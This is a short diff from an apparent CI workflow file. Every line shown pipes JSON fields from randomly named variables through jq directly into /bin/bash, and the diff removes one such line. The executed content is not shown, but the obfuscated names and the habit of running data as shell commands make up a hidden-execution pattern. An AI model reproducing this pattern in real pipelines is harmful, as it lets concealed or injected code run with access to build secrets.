@@ -21,7 +21,6 @@ jobs:
           echo $nodzj93 | jq -r .q8791 | /bin/bash
           printf '%s' "$yj778" | jq -r .zchkn7958 | /bin/bash
           printf '%s' "$ekefb53" | jq -r .qd4 | /bin/bash
-          printf '%s' "$tf64" | jq -r .gobuf08 | /bin/bash
           echo $tlkwj2050 | jq -r .p85852 | /bin/bash
           echo $ur416 | jq -r .vv2 | /bin/bash
           echo $pfuca442 | jq -r .lhtiz0 | /bin/bash
